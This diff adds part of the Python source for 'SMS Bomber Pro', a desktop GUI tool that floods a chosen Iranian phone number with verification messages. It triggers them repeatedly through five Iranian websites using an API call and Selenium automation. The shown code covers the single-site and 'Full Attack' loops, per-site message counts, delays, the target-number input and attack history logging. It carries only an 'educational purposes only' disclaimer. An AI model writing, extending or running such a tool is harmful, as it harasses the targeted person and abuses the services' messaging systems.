+        if phone in self.blacklist:
+            messagebox.showwarning("Error", "Phone is blacklisted")
+            return
+        
+        attack_mode = self.method_combo.get()
+        delay = self.settings.get("default_delay", 3)
+        
+        # حالت همزمان
+        if attack_mode == "Full Attack (All 5 Sites)":
+            counts = {
+                "divar": self._get_count(self.divar_count_entry.get(), 3, 1, 5),
+                "ketabrah": self._get_count(self.ketabrah_count_entry.get(), 2, 1, 3),
+                "rubika": self._get_count(self.rubika_count_entry.get(), 2, 1, 3),
+                "aparat": self._get_count(self.aparat_count_entry.get(), 2, 1, 3),
+                "torob": self._get_count(self.torob_count_entry.get(), 2, 1, 3),
+            }
+            total = sum(counts.values())
+            
+            if not messagebox.askyesno("Confirm Attack", 
+                                       f"🔥 Full Attack (5 Sites)\n\nTarget: {phone}\n"
+                                       f"Divar: {counts['divar']}\n"
+                                       f"Ketabrah: {counts['ketabrah']}\n"
+                                       f"Rubika: {counts['rubika']}\n"
+                                       f"Aparat: {counts['aparat']}\n"
+                                       f"Torob: {counts['torob']}\n"
+                                       f"\nTotal Messages: {total}\n\nProceed?"):
+                return
+            
+            self.stats = {"success": 0, "failed": 0}
+            self._update_stats_display()
+            self.is_running = True
+            self.start_btn.configure(state="disabled", text="⚔️ Full Attack...")
+            self.stop_btn.configure(state="normal")
+            self.status_label.configure(text="● Full Attack in progress", text_color="#FF9800")
+            
+            def run():
+                sites = [
+                    ("Divar", self._send_via_divar_api, counts["divar"]),
+                    ("Ketabrah", self._send_via_ketabrah_selenium, counts["ketabrah"]),
+                    ("Rubika", self._send_via_rubika_selenium, counts["rubika"]),
+                    ("Aparat", self._send_via_aparat_selenium, counts["aparat"]),
+                    ("Torob", self._send_via_torob_selenium, counts["torob"])
+                ]
+                total_success = 0
+                total_attempts = sum(c for _, _, c in sites)
+                
+                for site_name, send_func, count in sites:
+                    if not self.is_running:
+                        break
+                    for i in range(count):
+                        if not self.is_running:
+                            break
+                        self._log(f"{site_name} → {i+1}/{count}", "info")
+                        if send_func(phone):
+                            total_success += 1
+                            self._log(f"  ✓ {site_name} #{i+1} sent", "success")
+                        else:
+                            self._log(f"  ✗ {site_name} #{i+1} failed", "error")
+                        
+                        self.stats["success"] = total_success
+                        self.stats["failed"] = total_attempts - total_success
+                        self._update_stats_display()
+                        time.sleep(delay)
+                
+                self.is_running = False
+                self.start_btn.configure(state="normal", text="🚀 Start Attack")
+                self.stop_btn.configure(state="disabled")
+                self.status_label.configure(text="● Ready", text_color="#00C853")
+                
+                self._save_history({
+                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                    "phone": phone,
+                    "mode": "Full Attack (5 Sites)",
+                    "success": total_success,
+                    "total": total_attempts,
+                    "result": "Completed" if total_success > 0 else "Failed"
+                })
+                self._update_dashboard()
+                self._update_history_tab()
+                self._log(f"Attack finished | Success: {total_success}/{total_attempts}", "success" if total_success>0 else "error")
+                if self.settings.get("sound", True):
+                    winsound.Beep(1500, 500)
+                if self.settings.get("notifications", True):
+                    Notification.show(self, f"Attack completed! Success: {total_success}/{total_attempts}", "success" if total_success>0 else "error")
+            
+            threading.Thread(target=run, daemon=True).start()
+            return
+        
+        # حالت تکی
+        send_map = {
+            "Divar API (Fast)": (self._send_via_divar_api, "Divar", 5),
+            "Ketabrah Selenium": (self._send_via_ketabrah_selenium, "Ketabrah", 3),
+            "Rubika Selenium": (self._send_via_rubika_selenium, "Rubika", 3),
+            "Aparat Selenium": (self._send_via_aparat_selenium, "Aparat", 3),
+            "Torob Selenium": (self._send_via_torob_selenium, "Torob", 3),
+        }
+        
+        if attack_mode not in send_map:
+            return
+        
+        send_func, method_name, max_count = send_map[attack_mode]
+        try:
+            count = int(self.count_entry.get())
+            count = max(1, min(max_count, count))
+        except:
+            count = 3 if max_count > 3 else max_count
+        
+        if not messagebox.askyesno("Confirm Attack", f"Mode: {method_name}\nTarget: {phone}\nCount: {count}\n\nProceed?"):
+            return
+        
+        self.stats = {"success": 0, "failed": 0}
+        self._update_stats_display()
+        self.is_running = True
+        self.start_btn.configure(state="disabled", text="📨 Sending...")
+        self.stop_btn.configure(state="normal")
+        self.status_label.configure(text="● Sending...", text_color="#FF9800")
+        
+        def run():
+            success_count = 0
+            for i in range(count):
+                if not self.is_running:
+                    break
+                self._log(f"{method_name} → {i+1}/{count}", "info")
+                if send_func(phone):
+                    success_count += 1
+                    self._log(f"  ✓ Message #{i+1} sent", "success")
+                else:
+                    self._log(f"  ✗ Message #{i+1} failed", "error")
+                
+                self.stats["success"] = success_count
+                self.stats["failed"] = count - success_count
+                self._update_stats_display()
+                if self.is_running and i < count-1 and delay > 0:
+                    time.sleep(delay)
+            
+            self._save_history({
+                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "phone": phone,
+                "mode": method_name,
+                "success": success_count,
+                "total": count,
+                "result": "Completed" if success_count > 0 else "Failed"
+            })
+            self._log(f"Attack finished | Success: {success_count}/{count}", "success" if success_count>0 else "error")
+            self.is_running = False
+            self.start_btn.configure(state="normal", text="🚀 Start Attack")
+            self.stop_btn.configure(state="disabled")
+            self.status_label.configure(text="● Ready", text_color="#00C853")
+            self._update_dashboard()
+            self._update_history_tab()
+            if self.settings.get("sound", True):
+                winsound.Beep(1500, 500)
+            if self.settings.get("notifications", True):
+                Notification.show(self, f"Attack completed! Success: {success_count}/{count}", "success" if success_count>0 else "error")
+        
+        threading.Thread(target=run, daemon=True).start()
+    
+    def _stop_attack(self):
+        self.is_running = False
+        self._log("⚠️ Stopping attack...", "warning")
+    
+    def _get_count(self, value, default, min_val, max_val):
+        try:
+            c = int(value)
+            return max(min_val, min(max_val, c))
+        except:
+            return default
+    
+    # ==================== ساخت رابط کاربری ====================
+    def _setup_ui(self):
+        self.grid_rowconfigure(0, weight=1)
+        self.grid_columnconfigure(0, weight=1)
+        self.scrollable_frame = ScrollableFrame(self, width=1400, height=950)
+        self.scrollable_frame.grid(row=0, column=0, sticky="nsew")
+        self.scrollable_frame.grid_columnconfigure(0, weight=1)
+        main = self.scrollable_frame
+        
+        # Header
+        header = ctk.CTkFrame(main, fg_color="transparent", height=70)
+        header.grid(row=0, column=0, sticky="ew", padx=20, pady=(15,5))
+        header.grid_columnconfigure(0, weight=1)
+        
+        title_label = ctk.CTkLabel(header, text="SMS BOMBER PRO", font=("Segoe UI", 26, "bold"), text_color="#00C853")
+        title_label.grid(row=0, column=0, sticky="w", padx=10)
+        
+        subtitle_label = ctk.CTkLabel(header, text="Complete Edition | 5 Sites | All Iranian Prefixes Supported", 
+                                      font=("Inter", 11), text_color="gray")
+        subtitle_label.grid(row=1, column=0, sticky="w", padx=10)
+        
+        # ==================== لیبل اختصاصی شما ====================
+        developer_label = ctk.CTkLabel(
+            header,
+            text="👨‍💻 Developed by: Nima Koushki",
+            font=ctk.CTkFont(size=14, weight="bold"),
+            text_color="#00BFFF"
+        )
+        developer_label.grid(row=2, column=0, sticky="w", padx=10, pady=(0,5))
+        # ===========================================================
+        
+        header_btns = ctk.CTkFrame(header, fg_color="transparent")
+        header_btns.grid(row=0, column=1, sticky="e", padx=10)
+        
+        theme_btn = ctk.CTkButton(header_btns, text="🌓 Theme", command=self._toggle_theme, width=100, height=35, font=("Segoe UI", 12))
+        theme_btn.pack(side="left", padx=5)
+        
+        settings_btn = ctk.CTkButton(header_btns, text="⚙️ Settings", command=self._open_settings, width=100, height=35, font=("Segoe UI", 12))
+        settings_btn.pack(side="left", padx=5)
+        
+        ToolTip(theme_btn, "Switch between dark and light mode")
+        ToolTip(settings_btn, "Open application settings")
+        
+        # Dashboard
+        dashboard_frame = ctk.CTkFrame(main, corner_radius=12)
+        dashboard_frame.grid(row=1, column=0, sticky="ew", padx=20, pady=10)
+        ctk.CTkLabel(dashboard_frame, text="Dashboard", font=("Segoe UI", 16, "bold")).pack(anchor="w", padx=15, pady=(12,8))
+        
+        cards_frame = ctk.CTkFrame(dashboard_frame, fg_color="transparent")
+        cards_frame.pack(fill="x", padx=15, pady=8)
+        
+        # Success Card
+        success_frame = ctk.CTkFrame(cards_frame, fg_color="#1B5E20", corner_radius=12, height=90)
+        success_frame.pack(side="left", padx=8, fill="x", expand=True)
+        ctk.CTkLabel(success_frame, text="✓ SUCCESS", font=("Segoe UI", 11, "bold")).pack(pady=(12,0))
+        self.success_card = ctk.CTkLabel(success_frame, text="0", font=("Segoe UI", 32, "bold"))
+        self.success_card.pack()
+        
+        # Failed Card
+        failed_frame = ctk.CTkFrame(cards_frame, fg_color="#B71C1C", corner_radius=12, height=90)
+        failed_frame.pack(side="left", padx=8, fill="x", expand=True)
+        ctk.CTkLabel(failed_frame, text="✗ FAILED", font=("Segoe UI", 11, "bold")).pack(pady=(12,0))
+        self.failed_card = ctk.CTkLabel(failed_frame, text="0", font=("Segoe UI", 32, "bold"))
+        self.failed_card.pack()
+        
+        # Rate Card
+        rate_frame = ctk.CTkFrame(cards_frame, fg_color="#E65100", corner_radius=12, height=90)
+        rate_frame.pack(side="left", padx=8, fill="x", expand=True)
+        ctk.CTkLabel(rate_frame, text="📈 RATE", font=("Segoe UI", 11, "bold")).pack(pady=(12,0))
+        self.rate_card = ctk.CTkLabel(rate_frame, text="0%", font=("Segoe UI", 32, "bold"))
+        self.rate_card.pack()
+        
+        # Chart
+        chart_container = ctk.CTkFrame(cards_frame, fg_color="transparent", corner_radius=12, height=90)
+        chart_container.pack(side="right", padx=8, fill="both", expand=True)
+        self.chart_frame = ctk.CTkFrame(chart_container, fg_color="transparent")
+        self.chart_frame.pack(fill="both", expand=True)
+        
+        # Status Bar
+        status_frame = ctk.CTkFrame(main, corner_radius=8, fg_color="#1a1a2e")
+        status_frame.grid(row=2, column=0, sticky="ew", padx=20, pady=5)
+        self.status_label = ctk.CTkLabel(status_frame, text="● Ready", font=("Segoe UI", 12, "bold"), text_color="#00C853")
+        self.status_label.pack(pady=6)
+        self.stats_label = ctk.CTkLabel(status_frame, text="✓ Success: 0  |  ✗ Failed: 0  |  📈 Rate: 0%", font=("Inter", 11))
+        self.stats_label.pack(pady=2)
+        self.progress_bar = ctk.CTkProgressBar(status_frame, width=500, height=8, corner_radius=4)
+        self.progress_bar.pack(pady=8)
+        self.progress_bar.set(0)
+        
+        # Phone Input
+        input_frame = ctk.CTkFrame(main, corner_radius=10, border_width=1)
+        input_frame.grid(row=3, column=0, sticky="ew", padx=20, pady=8)
+        ctk.CTkLabel(input_frame, text="Target Phone Number", font=("Segoe UI", 13, "bold")).pack(anchor="w", padx=12, pady=(10,5))
+        
+        phone_row = ctk.CTkFrame(input_frame, fg_color="transparent")
+        phone_row.pack(fill="x", padx=12, pady=(0,12))
+        self.phone_entry = ctk.CTkEntry(phone_row, placeholder_text="09123456789 or 09964521983", height=40, width=280, font=("Inter", 11))
+        self.phone_entry.pack(side="left", padx=(0,12))
+        validate_btn = ctk.CTkButton(phone_row, text="✓ Validate", command=self._validate_phone, width=90, height=38, font=("Segoe UI", 12))
+        validate_btn.pack(side="left", padx=(0,10))
+        save_btn = ctk.CTkButton(phone_row, text="💾 Save", command=self._save_phone_simple, width=90, height=38, fg_color="#1976D2", font=("Segoe UI", 12))
+        save_btn.pack(side="left", padx=(0,10))
+        paste_btn = ctk.CTkButton(phone_row, text="📋 Paste", command=self._paste_phone, width=90, height=38, fg_color="#FF8F00", font=("Segoe UI", 12))
+        paste_btn.pack(side="left")
+        self.phone_status = ctk.CTkLabel(phone_row, text="", font=("Inter", 11))
+        self.phone_status.pack(side="left", padx=15)
+        
+        ToolTip(validate_btn, "Check if phone number is valid")
+        ToolTip(save_btn, "Save phone number to contacts")
+        ToolTip(paste_btn, "Paste phone number from clipboard")
+        
+        # Attack Mode Selection
+        mode_frame = ctk.CTkFrame(main, corner_radius=10, border_width=1)
+        mode_frame.grid(row=4, column=0, sticky="ew", padx=20, pady=8)
+        ctk.CTkLabel(mode_frame, text="Attack Mode", font=("Segoe UI", 13, "bold")).pack(anchor="w", padx=12, pady=(10,5))
+        
+        mode_row = ctk.CTkFrame(mode_frame, fg_color="transparent")
+        mode_row.pack(fill="x", padx=12, pady=(0,10))
+        
+        self.method_combo = ctk.CTkOptionMenu(mode_row, 
+            values=[
+                "Divar API (Fast)", 
+                "Ketabrah Selenium", 
+                "Rubika Selenium", 
+                "Aparat Selenium",
+                "Torob Selenium",
+                "Full Attack (All 5 Sites)"
+            ], 
+            width=240, font=("Inter", 11))
+        self.method_combo.pack(side="left", padx=(0,20))
+        
+        ctk.CTkLabel(mode_row, text="Count (for single mode):", font=("Inter", 11)).pack(side="left", padx=(0,5))
+        self.count_entry = ctk.CTkEntry(mode_row, width=80, font=("Inter", 11))
+        self.count_entry.insert(0, "3")
+        self.count_entry.pack(side="left")
+        ctk.CTkLabel(mode_row, text="(max 5 for Divar, 3 for others)", font=("Inter", 9), text_color="gray").pack(side="left", padx=10)
+        
+        # Full Attack Settings
+        full_frame = ctk.CTkFrame(main, corner_radius=10, border_width=1)
+        full_frame.grid(row=5, column=0, sticky="ew", padx=20, pady=8)
+        ctk.CTkLabel(full_frame, text="Full Attack Settings (All 5 Sites)", font=("Segoe UI", 13, "bold")).pack(anchor="w", padx=12, pady=(10,5))
+        
+        row1 = ctk.CTkFrame(full_frame, fg_color="transparent")
+        row1.pack(fill="x", padx=12, pady=(0,5))
+        ctk.CTkLabel(row1, text="Divar:", font=("Inter", 11)).pack(side="left")
+        self.divar_count_entry = ctk.CTkEntry(row1, width=60, font=("Inter", 11))
+        self.divar_count_entry.insert(0, "3")
+        self.divar_count_entry.pack(side="left", padx=(5, 15))
+        ctk.CTkLabel(row1, text="Ketabrah:", font=("Inter", 11)).pack(side="left")
+        self.ketabrah_count_entry = ctk.CTkEntry(row1, width=60, font=("Inter", 11))
+        self.ketabrah_count_entry.insert(0, "2")
+        self.ketabrah_count_entry.pack(side="left", padx=(5, 15))
+        ctk.CTkLabel(row1, text="Rubika:", font=("Inter", 11)).pack(side="left")
+        self.rubika_count_entry = ctk.CTkEntry(row1, width=60, font=("Inter", 11))
+        self.rubika_count_entry.insert(0, "2")
+        self.rubika_count_entry.pack(side="left", padx=(5, 15))
+        ctk.CTkLabel(row1, text="Aparat:", font=("Inter", 11)).pack(side="left")
+        self.aparat_count_entry = ctk.CTkEntry(row1, width=60, font=("Inter", 11))
+        self.aparat_count_entry.insert(0, "2")
+        self.aparat_count_entry.pack(side="left", padx=(5, 0))
+        
+        row2 = ctk.CTkFrame(full_frame, fg_color="transparent")
+        row2.pack(fill="x", padx=12, pady=(5,10))
+        ctk.CTkLabel(row2, text="Torob:", font=("Inter", 11)).pack(side="left")
+        self.torob_count_entry = ctk.CTkEntry(row2, width=60, font=("Inter", 11))
+        self.torob_count_entry.insert(0, "2")
+        self.torob_count_entry.pack(side="left", padx=(5, 0))
+        
+        # Action Buttons
+        btn_frame = ctk.CTkFrame(main, fg_color="transparent")
+        btn_frame.grid(row=6, column=0, sticky="ew", padx=20, pady=15)
+        btn_frame.grid_columnconfigure(0, weight=1)
+        btn_frame.grid_columnconfigure(1, weight=1)
+        
+        self.start_btn = ctk.CTkButton(btn_frame, text="🚀 Start Attack", command=self._start_attack, height=55, 
+                                      font=("Segoe UI", 15, "bold"), fg_color="#2E7D32", hover_color="#1B5E20")
+        self.start_btn.grid(row=0, column=0, sticky="ew", padx=(0,8))
+        self.stop_btn = ctk.CTkButton(btn_frame, text="⏹️ Stop", command=self._stop_attack, height=55, 
+                                     font=("Segoe UI", 15, "bold"), fg_color="#C62828", hover_color="#B71C1C", state="disabled")
+        self.stop_btn.grid(row=0, column=1, sticky="ew", padx=(8,0))
+        
+        ToolTip(self.start_btn, "Start sending SMS attacks")
+        ToolTip(self.stop_btn, "Stop current attack operation")
+        
+        # Tabs
+        tabview = ctk.CTkTabview(main, height=300)
+        tabview.grid(row=7, column=0, sticky="ew", padx=20, pady=10)
+        
+        # Contacts Tab
+        contacts_tab = tabview.add("📞 Contacts")
+        self.phone_listbox = scrolledtext.ScrolledText(contacts_tab, height=8, state="normal", 
+                                                        bg="#1E1E1E", fg="#E0E0E0", 
+                                                        font=("JetBrains Mono", 10), wrap="none")
+        self.phone_listbox.pack(fill="both", expand=True, padx=10, pady=10)
+        self.phone_listbox.bind("<Double-Button-1>", self._on_contact_double_click)
+        
+        contacts_btn_frame = ctk.CTkFrame(contacts_tab, fg_color="transparent")
+        contacts_btn_frame.pack(fill="x", padx=10, pady=(0,10))
+        use_contact_btn = ctk.CTkButton(contacts_btn_frame, text="📱 Use Selected", command=self._use_selected_contact, width=100, height=32, font=("Segoe UI", 11))
+        use_contact_btn.pack(side="left", padx=5)
+        edit_contact_btn = ctk.CTkButton(contacts_btn_frame, text="✏️ Edit", command=self._edit_contact, width=80, height=32, font=("Segoe UI", 11))
+        edit_contact_btn.pack(side="left", padx=5)
+        delete_contact_btn = ctk.CTkButton(contacts_btn_frame, text="🗑️ Delete", command=self._delete_contact, width=80, height=32, fg_color="#C62828", font=("Segoe UI", 11))
+        delete_contact_btn.pack(side="left", padx=5)
+        ctk.CTkLabel(contacts_btn_frame, text="💡 Double-click to select", font=("Inter", 9), text_color="gray").pack(side="right", padx=10)
+        
+        # Blacklist Tab
+        blacklist_tab = tabview.add("🚫 Blacklist")
+        self.black_listbox = scrolledtext.ScrolledText(blacklist_tab, height=6, state="normal", 
+                                                        bg="#1E1E1E", fg="#E0E0E0", 
+                                                        font=("JetBrains Mono", 10), wrap="none")
+        self.black_listbox.pack(fill="both", expand=True, padx=10, pady=10)
+        blacklist_btn_frame = ctk.CTkFrame(blacklist_tab, fg_color="transparent")
+        blacklist_btn_frame.pack(fill="x", padx=10, pady=(0,10))
+        add_blacklist_btn = ctk.CTkButton(blacklist_btn_frame, text="➕ Add Current", command=self._add_to_blacklist, width=120, height=32, font=("Segoe UI", 11))
+        add_blacklist_btn.pack(side="left", padx=5)
+        remove_blacklist_btn = ctk.CTkButton(blacklist_btn_frame, text="➖ Remove Selected", command=self._remove_from_blacklist, width=140, height=32, fg_color="#C62828", font=("Segoe UI", 11))
+        remove_blacklist_btn.pack(side="left", padx=5)
+        
+        # History Tab
+        history_tab = tabview.add("📜 History")
+        columns = ("Time", "Phone", "Mode", "Result", "Status")
+        self.history_tree = ttk_widgets.Treeview(history_tab, columns=columns, show="headings", height=10)
+        col_widths = {"Time": 160, "Phone": 110, "Mode": 140, "Result": 80, "Status": 100}
+        for col in columns:
+            self.history_tree.heading(col, text=col)
+            self.history_tree.column(col, width=col_widths.get(col, 100))
+        history_scrollbar = ttk_widgets.Scrollbar(history_tab, orient="vertical", command=self.history_tree.yview)
+        self.history_tree.configure(yscrollcommand=history_scrollbar.set)
+        self.history_tree.pack(side="left", fill="both", expand=True, padx=10, pady=10)
+        history_scrollbar.pack(side="right", fill="y", padx=(0,10), pady=10)
+        
+        # Log Tab
+        log_tab = tabview.add("📋 Log")
+        self.log_area = scrolledtext.ScrolledText(log_tab, height=8, state="disabled", 
+                                                   bg="#1E1E1E", fg="#E0E0E0", 
+                                                   font=("JetBrains Mono", 10), wrap="word")
+        self.log_area.pack(fill="both", expand=True, padx=10, pady=10)
+        self.log_area.tag_config("success", foreground="#00C853")
+        self.log_area.tag_config("error", foreground="#D32F2F")
+        self.log_area.tag_config("warning", foreground="#FF9800")
+        self.log_area.tag_config("info", foreground="#2196F3")
+        clear_log_btn = ctk.CTkButton(log_tab, text="🧹 Clear Log", command=self._clear_log, width=120, height=32, font=("Segoe UI", 11))
+        clear_log_btn.pack(pady=10)
+        
+        # Activity Tab
+        activity_tab = tabview.add("📊 Activity")
+        self.activity_listbox = scrolledtext.ScrolledText(activity_tab, height=8, state="normal", 
+                                                           bg="#1E1E1E", fg="#E0E0E0", 
+                                                           font=("JetBrains Mono", 10), wrap="word")
+        self.activity_listbox.pack(fill="both", expand=True, padx=10, pady=10)
+        self.activity_listbox.configure(state="disabled")
+        
+        # About Tab
+        about_tab = tabview.add("👨‍💻 About")
+        about_frame = ctk.CTkFrame(about_tab, fg_color="transparent")
+        about_frame.pack(fill="both", expand=True, padx=20, pady=20)
+        
+        ctk.CTkLabel(
+            about_frame,
+            text="📱 SMS Bomber Pro",
+            font=ctk.CTkFont(size=24, weight="bold"),
+            text_color="#00C853"
+        ).pack(pady=(10, 5))
+        
+        ctk.CTkLabel(
+            about_frame,
+            text="Version 6.2 - Complete Edition",
+            font=ctk.CTkFont(size=14),
+            text_color="gray"
+        ).pack(pady=5)
+        
+        ctk.CTkLabel(
+            about_frame,
+            text="\n👨‍💻 Developer: Nima Koushki\n",
+            font=ctk.CTkFont(size=16, weight="bold"),
+            text_color="#00BFFF"
+        ).pack(pady=10)
+        
+        ctk.CTkLabel(
+            about_frame,
+            text="⚡ Features:\n• 5 Sites: Divar, Ketabrah, Rubika, Aparat, Torob\n• All Iranian prefixes supported (091-099)\n• Phone validation with operator detection\n• Contacts management with names\n• Blacklist & History\n• Real-time statistics & charts",
+            font=ctk.CTkFont(size=12),
+            text_color="#B0B0B0",
+            justify="center"
+        ).pack(pady=10)
+        
+        ctk.CTkLabel(
+            about_frame,
+            text="⚠️ For educational purposes only",
+            font=ctk.CTkFont(size=11),
+            text_color="#FF9800"
+        ).pack(pady=10)
+        
+        # Footer
+        footer = ctk.CTkFrame(main, fg_color="transparent")
+        footer.grid(row=8, column=0, sticky="ew", padx=20, pady=(5,15))
+        footer.grid_columnconfigure(0, weight=1)
+        footer.grid_columnconfigure(1, weight=1)
+        
+        ctk.CTkLabel(footer, text="⚠️ For educational purposes only | Kharazmi Festival", 
+                     font=("Inter", 9), text_color="gray").grid(row=0, column=0, sticky="w")
+        ctk.CTkLabel(footer, text=f"Version 6.2 | 5 Sites | All Iranian Prefixes | {datetime.now().year}", 
+                     font=("Inter", 9), text_color="gray").grid(row=0, column=1, sticky="e")
+    
+    def run(self):
+        try:
+            self.mainloop()
+        except Exception as e:
+            print(f"Error: {e}")
+            import traceback
+            traceback.print_exc()
+            input("Press Enter to exit...")
+
+
+if __name__ == "__main__":
+    app = SMSBomberPro()
+    app.run()
